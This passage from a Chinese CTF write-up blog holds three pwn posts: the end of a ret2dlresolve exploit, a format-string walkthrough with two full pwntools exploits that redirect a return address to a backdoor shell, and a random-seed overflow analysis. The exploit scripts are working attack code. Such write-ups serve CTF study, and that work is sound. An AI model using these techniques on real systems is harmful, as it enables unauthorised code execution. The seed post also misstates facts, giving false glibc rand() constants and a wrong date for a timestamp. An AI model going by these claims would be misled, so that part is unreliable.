<span class="comment"># 构造字符串</span></span><br><span class="line">binsh_str  = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">str_offset    =  fake_str_addr - dynstr_addr <span class="comment"># 计算字符串偏移</span></span><br><span class="line">sym_index     = (fake_sym_addr - dynsym_addr)   // <span class="number">0x18</span> <span class="comment"># 计算符号索引</span></span><br><span class="line">reloc_offset  = (fake_reloc_addr - rel_plt_addr)// <span class="number">0x18</span> <span class="comment"># 计算伪造的重定位条目偏移</span></span><br><span class="line"></span><br><span class="line">st_name  = str_offset       <span class="comment"># 4字节</span></span><br><span class="line">st_info  = <span class="number">0x12</span>            <span class="comment"># STB_GLOBAL|STT_FUNC</span></span><br><span class="line">st_other = <span class="number">0x00</span></span><br><span class="line">st_shndx = <span class="number">0x0000</span></span><br><span class="line">st_value = <span class="number">0x0</span></span><br><span class="line">st_size  = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">reloc_type    =  <span class="number">0x7</span>  <span class="comment"># R_X86_64_JUMP_SLOT</span></span><br><span class="line">target_got_addr = <span class="number">0x404018</span> <span class="comment"># 选择一个可写的GOT项写入（objdump -R ./dlsolve64）</span></span><br><span class="line"></span><br><span class="line">r_info    = (sym_index &lt;&lt; <span class="number">32</span>) | reloc_type <span class="comment"># 构造 r_info</span></span><br><span class="line">r_offset  =  target_got_addr <span class="comment"># R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span></span><br><span class="line">r_addend  =  <span class="number">0</span></span><br><span class="line"></span><br><span class="line">fake_sym = p32(st_name)                  <span class="comment"># 4字节: st_name：字符串表偏移</span></span><br><span class="line">fake_sym += p8(st_info) + p8(st_other) + p16(st_shndx)  <span class="comment"># 4字节（1字节：符号绑定和类型 1字节：保留字段 2字节：符号所在的段索引</span></span><br><span class="line">fake_sym += p64(st_value)                <span class="comment"># 8字节: st_value：符号的值（地址）</span></span><br><span class="line">fake_sym += p64(st_size)                 <span class="comment"># 8字节: st_size：符号大小</span></span><br><span class="line"></span><br><span class="line">fake_reloc = p64(r_offset)    <span class="comment"># 8字节: r_offset</span></span><br><span class="line">fake_reloc += p64(r_info)     <span class="comment"># 8字节: r_info</span></span><br><span class="line">fake_reloc += p64(r_addend)   <span class="comment"># 8字节: r_addend</span></span><br><span class="line"></span><br><span class="line">payload = fake_sym.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 在符号表条目后面加了一点 padding</span></span><br><span class="line">payload += fake_reloc.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += system_str</span><br><span class="line">payload += binsh_str</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">128</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr+<span class="number">0x100</span>)  <span class="comment"># fake rbp</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(fake_binsh_addr) <span class="comment"># system的参数: &quot;/bin/sh&quot;</span></span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(plt_0_addr)      <span class="comment"># 跳转到PLT[0]</span></span><br><span class="line">payload += p64(reloc_offset)    <span class="comment"># 重定位条目索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *0x401020</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="小注"><a href="#小注" class="headerlink" title="小注"></a>小注</h2><p>第一次我是想构造 system(&#x2F;bin&#x2F;sh)，设置断点可以看到程序已经解析出了<code>system</code>，但是<code>system</code>内部执行时 posix_spawn 函数出了一些问题导致父进程退出，查了一下应该是 attrp 数组指针的问题，由于栈迁移到了bss段，无法完全控制 attrp 数组，导致崩溃</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/system.png" alt="image-20260124234656972"></p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/error.png" alt="image-20260124235937435"></p>
<p>更稳定的方式是构造 execuv ，不过自己编译的这个程序比较小，没有出现pop rdi ret和pop rsi ret，所以我就显式写了一个内联汇编函数，保证出现pop rdi ret和pop rsi ret去实现 execve</p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/execve.png" alt="image-20260130113429885"></p>
<p><img src="/images/26-1-29-ret2dlresolve%E6%8A%80%E6%9C%AF/result.png" alt="image-20260130113657102"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/14/2025-12-14-week1-Format%20String/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/14/2025-12-14-week1-Format%20String/" class="post-title-link" itemprop="url">CTF题解：Format String</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-12-14 19:29:00" itemprop="dateCreated datePublished" datetime="2025-12-14T19:29:00+08:00">2025-12-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-12-16 11:20:57" itemprop="dateModified" datetime="2025-12-16T11:20:57+08:00">2025-12-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="week1-Format-String"><a href="#week1-Format-String" class="headerlink" title="week1-Format-String"></a>week1-Format-String</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/25-12-14-pwn4-Format-String/checksec.png" alt="image-20251214104847251"></p>
<p><img src="/images/25-12-14-pwn4-Format-String/vuln.png" alt="image-20251214105053214"></p>
<p><img src="/images/25-12-14-pwn4-Format-String/backdoor.png" alt="image-20251214194047129"></p>
<p>有三次输入机会，向 buf 输入256字节，并且 printf 将 buf 当作参数，明显格式化字符串漏洞。因为没有 pie，尝试将返回地址修改为后门函数</p>
<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>在第一次输入时打断</p>
<p><img src="/images/25-12-14-pwn4-Format-String/stack.png" alt="image-20251214105559934"></p>
<p>可以看到返回地址为 0x4012ba</p>
<p>输入多个 %p 查看</p>
<p><img src="/images/25-12-14-pwn4-Format-String/%25p.png" alt="屏幕截图 2025-12-14 105725"></p>
<p>第九个参数就是返回地址，我们需要通过 %c 和 %n 把这里修改为backdoor 地址 0x401205，并且只需要修改最低字节就可以</p>
<p>因为 %n 是向对应地址写入，我们希望向 0x4012ba 对应的栈地址写入，但是通过泄露的数据可以看到，没有指向 0x4012ba 的地址0x7fffffffde18。</p>
<p>再观察一下可以发现，我们能够修改 rbp 指向的值 0x7fffffffde20，将其最低字节覆盖为 0x18，这样就可以让 0x7fffffffde18出现在栈上，</p>
<p>然后再一次通过 %n 写返回地址即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;%p.&quot;</span>*<span class="number">20</span> + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 3 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">rbp = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).split(<span class="string">b&#x27;.&#x27;</span>)[<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(rbp) <span class="comment">#泄露栈地址</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">stack_byte = <span class="number">0x08</span> + <span class="built_in">int</span>(rbp[-<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_byte))</span><br><span class="line">payload2 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(stack_byte).encode() + <span class="string">b&quot;c%6$hhn&quot;</span> <span class="comment">#写指向返回地址的栈地址</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 2 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return_byte = <span class="number">0x05</span></span><br><span class="line">payload3 = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(return_byte).encode() + <span class="string">b&quot;c%8$hhn&quot;</span> <span class="comment">#写返回地址</span></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 1 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>这里再学习一下更好的exp写法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>, <span class="number">34859</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./pwn&#x27;)  </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 3 chances.\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;%8$p&#x27;</span>)  <span class="comment">#直接取对应参数，减少错误</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(sh.recv(<span class="number">12</span>), <span class="number">16</span>) <span class="comment">#接收12个字符，不算0x前缀，转化成整数</span></span><br><span class="line">log.success(<span class="string">f&quot;Stack leak: <span class="subst">&#123;<span class="built_in">hex</span>(stack_leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">target_addr = stack_leak - <span class="number">8</span></span><br><span class="line">log.info(<span class="string">f&quot;Target address: <span class="subst">&#123;<span class="built_in">hex</span>(target_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 2 chances.\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">f&quot;%<span class="subst">&#123;target_addr &amp; <span class="number">0xffff</span>&#125;</span>c%15$hn&quot;</span>.encode() <span class="comment">#表面看是&quot;对十进制数取低16位&quot;，但实际上底层是对二进制表示进行操作，可以得到正确的结果。</span></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&quot;You have 1 chances.\n&quot;</span>)</span><br><span class="line">bkd = <span class="number">0x401205</span></span><br><span class="line">payload3 = <span class="string">f&quot;%<span class="subst">&#123;bkd &amp; <span class="number">0xffff</span>&#125;</span>c%45$hn&quot;</span>.encode() <span class="comment">#这里注意用.encode()转化成字节</span></span><br><span class="line">sh.sendline(payload3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/10/2025-12-16-Vuln-Random-Seed/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Whoamiuu's Blogs">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/10/2025-12-16-Vuln-Random-Seed/" class="post-title-link" itemprop="url">CTF题解：vuln</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-12-10 13:56:00" itemprop="dateCreated datePublished" datetime="2025-12-10T13:56:00+08:00">2025-12-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2026-01-30 11:55:06" itemprop="dateModified" datetime="2026-01-30T11:55:06+08:00">2026-01-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Vuln-Random-Seed"><a href="#Vuln-Random-Seed" class="headerlink" title="Vuln-Random-Seed"></a>Vuln-Random-Seed</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/25-12-16-week1-Random-Seed/checksec.png" alt="image-20251210140132788"></p>
<p>checksec发现没有pie和canary</p>
<p><img src="/images/25-12-16-week1-Random-Seed/vuln.png" alt="image-20251216222334910"></p>
<p><img src="/images/25-12-16-week1-Random-Seed/myread.png" alt="屏幕截图 2025-12-16 222245"></p>
<p>浏览主要的反编译，只有在 myread 里有足够的溢出空间允许构造ROP链，但是我们需要猜测 rand （就是FUN_00401120函数）值99次，且不能有错，才能进入 myread。</p>
<p>我们看一下代码中的关键部分：</p>
<p><img src="/images/25-12-16-week1-Random-Seed/seed.png" alt="image-20251218103821063"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">undefined1 local_1a [<span class="number">10</span>];  <span class="comment">// 10字节的数组</span></span><br><span class="line">uint local_c;              <span class="comment">// 4字节的变量，存储了种子</span></span><br><span class="line"><span class="type">time_t</span> tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>); <span class="comment">// 获取当前时间（即时间戳）</span></span><br><span class="line">local_c = (uint)tVar2;    <span class="comment">// 将时间戳赋值给local_c</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, local_1a, <span class="number">0x12</span>);  <span class="comment">// 从用户输入读取18字节到local_1a</span></span><br><span class="line">srand(local_c);  <span class="comment">// 用local_c作为种子初始化随机数生成器</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>local_1a</code>只有10字节，但程序尝试从输入中读取18字节，这就会导致缓冲区溢出。栈布局，<code>local_1a</code>数组后面会紧跟着<code>local_c</code>。</li>
<li><strong>如何判断<code>local_1a</code>是否会覆盖<code>local_c</code>？</strong><ul>
<li><code>local_1a</code>的数组大小为10字节，<code>read(0, local_1a, 0x12)</code>读取了18字节数据，意味着超过10字节的部分会覆盖<code>local_1a</code>后的内存。</li>
<li><code>local_c</code>是4字节的变量，它紧跟在<code>local_1a</code>后面（假设栈是按从高地址到低地址的顺序存储局部变量）。</li>
<li>因此，当<code>read</code>读取18字节时，前10字节会填满<code>local_1a</code>，剩下的8字节（18-10&#x3D;8字节）将覆盖<code>local_c</code>。</li>
</ul>
</li>
</ul>
<p>通过这种缓冲区溢出，攻击者就可以控制<code>local_c</code>的值。由于<code>local_c</code>被用作<code>time(NULL)</code>的返回值（即当前时间的时间戳），因此攻击者可以通过覆盖<code>local_c</code>来控制随机数生成器的种子。</p>
<p><em>深入了解时间戳、随机数生成、种子</em></p>
<blockquote>
<h3 id="1-时间戳（Timestamp）"><a href="#1-时间戳（Timestamp）" class="headerlink" title="1. 时间戳（Timestamp）"></a>1. <strong>时间戳（Timestamp）</strong></h3><p><strong>时间戳</strong>通常表示特定时间点的整数。常见时间戳是<strong>Unix时间戳</strong>，表示从1970年1月1日（协调世界时，UTC）00:00:00到当前时间的秒数。</p>
<ul>
<li><strong>Unix时间戳</strong>的特点：<ul>
<li>是递增的数值，表示从1970年1月1日00:00:00 UTC到某个时刻经过的秒数。</li>
<li>是整数，单位是秒。它对于系统时间管理和计算机应用非常重要。</li>
<li>Unix时间戳通常被存储为一个32位或64位的整数。</li>
</ul>
</li>
</ul>
<p>例，Unix时间戳可能是 <code>1637220400</code>（即2021年11月10日00:00:00 UTC的秒数）。</p>
<p>C语言中，我们可以使用标准库中的<code>time()</code>函数来获取当前的时间戳。</p>
<h3 id="2-time-函数"><a href="#2-time-函数" class="headerlink" title="2. time() 函数"></a>2. <strong><code>time()</code> 函数</strong></h3><p>用于获取当前的时间戳。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time_t time(time_t *t);</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>参数：</strong></p>
<ul>
<li><code>t</code>：指向 <code>time_t</code> 类型的指针，如果传入 <code>NULL</code>，<code>time()</code> 会返回当前时间戳的值。</li>
<li>如果传入一个有效指针，<code>time()</code> 会将当前时间戳赋值给该指针指向的内存位置。</li>
</ul>
</li>
<li><p><strong>返回值：</strong></p>
<ul>
<li>返回从UTC到当前时间的秒数，类型为 <code>time_t</code>（通常是一个长整型）。</li>
<li>如果发生错误，返回 <code>(time_t)(-1)</code>。</li>
</ul>
</li>
<li><p><strong>示例：</strong></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;time.h&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span> &#123;</span><br><span class="line">    time_t t;</span><br><span class="line">    time(&amp;t);  <span class="comment">// 获取当前时间戳</span></span><br><span class="line">    printf(<span class="string">&quot;Current timestamp: %ld\n&quot;</span>, t);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Current</span> <span class="type">timestamp</span>: <span class="number">1637220400</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-srand-函数与随机数种子"><a href="#3-srand-函数与随机数种子" class="headerlink" title="3. srand() 函数与随机数种子"></a>3. <strong><code>srand()</code> 函数与随机数种子</strong></h3><p>用于设置伪随机数生成器的种子。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void srand(unsigned int seed);</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>参数：</strong></p>
<ul>
<li><p><code>seed</code>：用于初始化伪随机数生成器的种子，它是一个<strong>无符号整数</strong>。</p>
</li>
<li><p><code>srand()</code> 没有返回值。</p>
</li>
</ul>
</li>
</ul>
<p><strong>工作原理：</strong></p>
<ul>
<li><p><code>srand()</code> 会将提供的 <code>seed</code> 值传递给随机数生成器（通常是线性同余生成器）。从这时起，程序中所有的 <code>rand()</code> 调用都会基于这个种子值生成伪随机数。</p>
</li>
<li><p>如果你多次运行相同的程序并传递相同的种子值，那么每次调用 <code>rand()</code> 时会生成相同的随机数序列。</p>
</li>
<li><p><strong>为什么要使用种子？</strong></p>
<ul>
<li><strong>重现性</strong>：种子值确保了你可以控制随机数生成的起始状态。如果你用相同的种子多次运行程序，你得到的随机数序列是一样的。（对于调试和测试非常重要）</li>
<li><strong>随机性</strong>：如果不设置种子，<code>rand()</code> 的结果通常是不可预测的，因为它可能会<em>以某种固定方式生成随机数序列，导致每次运行时生成相同的随机数</em>。</li>
</ul>
</li>
<li><p><strong>示例：</strong></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;time.h&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span> &#123;</span><br><span class="line">    srand(time(NULL));  <span class="comment">// 用当前时间作为种子初始化随机数生成器</span></span><br><span class="line">    printf(<span class="string">&quot;Random number: %d\n&quot;</span>, rand());  <span class="comment">// 生成一个随机数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>使用 <code>time(NULL)</code> 作为种子</strong>：<ul>
<li><code>time(NULL)</code> 会返回当前的时间戳（当前秒数）。每次程序运行时，<code>time(NULL)</code> 都会返回不同的值，这样就能确保每次生成不同的随机数序列。</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><p>我们查看 disas main 尝试分析一下栈布局以及种子</p>
<p><img src="/images/25-12-16-week1-Random-Seed/dismain.png" alt="image-20251218102848053"></p>
<p>这里有两个重要信息：</p>
<ul>
<li><p>seed &#x2F; 时间戳</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call time@plt</span><br><span class="line">mov  DWORD PTR [rbp-0x4], eax</span><br></pre></td></tr></table></figure>
</li>
<li><p>缓冲区 local_1a</p>
</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea rax, [rbp-0x12]</span><br><span class="line">mov edx, 0x12</span><br><span class="line">call read</span><br></pre></td></tr></table></figure>

<p>所以，种子 local_c 在 rbp - 0x4 处，数组起始地址在 rbp - 0x12 处。</p>
<p>计算一下栈布局</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rbp</span>+<span class="number">0</span>x8   ← 返回地址</span><br><span class="line"><span class="built_in">rbp</span>       ← old <span class="built_in">rbp</span></span><br><span class="line"><span class="literal">--------------------------------</span></span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x4</span>   ← local_c (seed, <span class="number">4</span>字节)</span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x8</span>   ← local_10</span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x12</span>  ← local_1a[?]</span><br><span class="line"><span class="built_in">rbp</span><span class="literal">-0x18</span>  ← local_20</span><br><span class="line"><span class="literal">--------------------------------</span></span><br><span class="line">rsp = <span class="built_in">rbp</span><span class="literal">-0x20</span></span><br></pre></td></tr></table></figure>

<p>所以读取0x12（18）字节溢出，最后0x4字节就可以覆盖seed</p>
<p>那么，seed变成0后，rand会基于0生成伪随机数，下面看一下rand() 是如何生成伪随机数的</p>
<blockquote>
<h3 id="rand-的实现"><a href="#rand-的实现" class="headerlink" title="rand() 的实现"></a><code>rand()</code> 的实现</h3><p><code>rand()</code> 是一个伪随机数生成器（PRNG，Pseudorandom Number Generator）。它基于一个种子来生成随机数。每当程序运行时，如果没有显式设置种子，系统通常会将种子设置为 0，或者如果程序调用了 <code>srand(0)</code>，种子就会是 0。</p>
<p>当种子固定时，<code>rand()</code> 返回的伪随机数是固定的，具体的随机数序列是由 PRNG 的算法和初始种子共同决定的。</p>
<h3 id="C-标准库中的-rand-函数"><a href="#C-标准库中的-rand-函数" class="headerlink" title="C 标准库中的 rand() 函数"></a>C 标准库中的 <code>rand()</code> 函数</h3><p>大多数系统中，<code>rand()</code> 的实现基于 <strong>线性同余生成器（LCG，Linear Congruential Generator）</strong> 算法。它的计算公式通常是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xn+1 = (a * Xn + c) % m</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<ul>
<li><code>Xn</code> 是当前的随机数状态。</li>
<li><code>a</code>, <code>c</code>, <code>m</code> 是一些常数，这些常数会根据系统和标准库的实现不同而有所差异。</li>
<li><code>Xn+1</code> 就是下一个伪随机数。</li>
</ul>
<p>对于 <strong>glibc</strong>（GNU C 库），<code>rand()</code> 使用的常数是：</p>
<ul>
<li><code>a = 0x343fd44f</code></li>
<li><code>c = 0x4a2d2b9b</code></li>
<li><code>m = 2^32</code></li>
</ul>
<h3 id="解析种子为-0-时-rand-的返回值"><a href="#解析种子为-0-时-rand-的返回值" class="headerlink" title="解析种子为 0 时 rand() 的返回值"></a>解析种子为 0 时 <code>rand()</code> 的返回值</h3><ol>
<li><p><strong>第一次调用 <code>rand()</code>：</strong><br> 当 <code>rand()</code> 第一次被调用时，<strong>当前状态 <code>X0</code> 是 0</strong>，所以根据上面的公式来计算 <code>X1</code>（即 <code>rand()</code> 的返回值）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X1 = (0x343fd44f * 0 + 0x4a2d2b9b) % 2^32</span><br><span class="line">X1 = 0x4a2d2b9b % 2^32</span><br><span class="line">X1 = 0x4a2d2b9b</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>转换为整数：</strong><br> <code>rand()</code> 返回的值是 <code>X1</code>，即 <code>0x4a2d2b9b</code>，它是一个 32 位的无符号整数。</p>
</li>
